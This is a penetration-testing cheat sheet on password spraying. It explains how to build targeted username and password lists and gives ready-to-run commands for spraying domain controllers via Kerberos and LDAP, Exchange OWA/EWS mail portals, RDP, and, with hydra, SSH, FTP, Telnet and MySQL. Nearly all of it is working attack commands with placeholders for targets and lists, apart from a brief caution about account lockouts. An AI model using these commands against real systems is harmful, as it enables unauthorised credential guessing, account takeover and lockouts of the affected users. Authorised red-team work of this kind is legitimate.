# __Password spraying__
>Author: Pieter Miske
---
### __Create username and password lists:__
#### _Create username list:_
>Based on identified email addresses, determine the username convention \(e\.g\. j\.smith, john\.smith\) and use that information to create a targeted username list.
- Create username list based on statistically likely [usernames](https://github.com/insidetrust/statistically-likely-usernames)
- Create username list with multiple username convention structures based on found employee names: 
	- 1\. Create a list of found employees full names \(e\.g\. Bob Farmer\)
	- 2\. Create usernames \([Namemash](https://gist.github.com/superkojiman/11076951)\): python namemash\.py names\.txt >> possible\-usernames\.txt

##### _Create targeted password list:_
>Keep it mind that patterns such as MonthYear \(August2019\), SeasonYear \(Summer2019\) and DayDate \(Tuesday6\) are very common\.
- Manually create a small common wordlist based on basic patterns \(MonthYear, SeasonYear, DayDate\) and very common words/numbers
- Generate a wordlist for password spraying by running the [goPassGen](https://github.com/bigb0sss/goPassGen) tool and follow wizard to create wordlist\. 
- Crawl target website to generate wordlist \([ceWL](https://github.com/digininja/CeWL)\): `cewl -m <minimal_word_length (e.g. 6)> -d 5 -w <output file.txt> <target ip or domain> --with-numbers`


---
### __Conduct password spraying:__
>Be aware that these authentication attempts may count towards the domain lockout policy for the users\. Too many attempts in a short period of time is not only loud, but may also lock accounts out\.
#### _Password spray targeting Domain Controller:_
Check if a found password or a common/weak one applies to a domain account\.
- Kerberos password spray: 
	- \([C2\-Tool\-Collection-BOF](https://github.com/outflanknl/C2-Tool-Collection)\) \(possible to specify account name filter\): `SprayAD <password> (<adm*>)`
	- \([SharpMapExec](https://github.com/cube0x0/SharpMapExec)\) Kerberos password spray (tool requires elevated privs on the system it's run from): `SharpMapExec kerbspray /users:C:\users\public\documents\users.txt /passwords:C:\users\public\documents\passwords.txt /domain:<FQDN> /dc:<FQDN target DC>`
- LDAP password spray:
    - (C2\-Tool\-Collection-BOF) \(uses logon event ID 4771 instead of 4625\): `SprayAD <password> ldap`
    - \([CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)\): `crackmapexec smb -u <username list> -p <password> (--exec-method wmiexec)`

#### _Password spray targeting mail server:_
- Spray against Exchange EWS/OWA portal \(use "Invoke\-PasswordSprayOWA" against an OWA portal\) \([MailSniper\.ps1](https://github.com/dafthack/MailSniper)\): `Invoke-PasswordSprayEWS -ExchHostname <FQDN or IP exchange server> -UserList <path to userlist.txt> -Password <single password> -Threads 15 -OutFile valid-creds.txt`
- Spray against multiple mail server types: \([SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)\): `./atomizer.py <owa | imap | lync> <target mail server domain> <single password> <email_list.txt>`

#### _Password spray targeting other services:_
- Spray against RDP enabled targets \(tool will only list successful logins\) \([Crowbar](https://github.com/galkan/crowbar)\): `sudo python3 crowbar.py -b rdp -s <single target ip>/32 -U <username list> -c <single password> -n 1`
- Bruteforce SSH login: `hydra -f -V -t 1 -L <wordlist/user> -P <wordlist/password> -s 22 <target ip>`
- Bruteforce FTP login: `hydra -L <username list> -P <password list> -f -o <output file> -u <target ip> -s 21 ftp`
- Bruteforce Telnet login: `hydra -L <usernames.txt> -P <passwords.txt> <target ip> telnet -V`
- Bruteforce MySQL login:`hydra -L <userlist.txt> -P <passlist.txt> -f <target ip> mysql`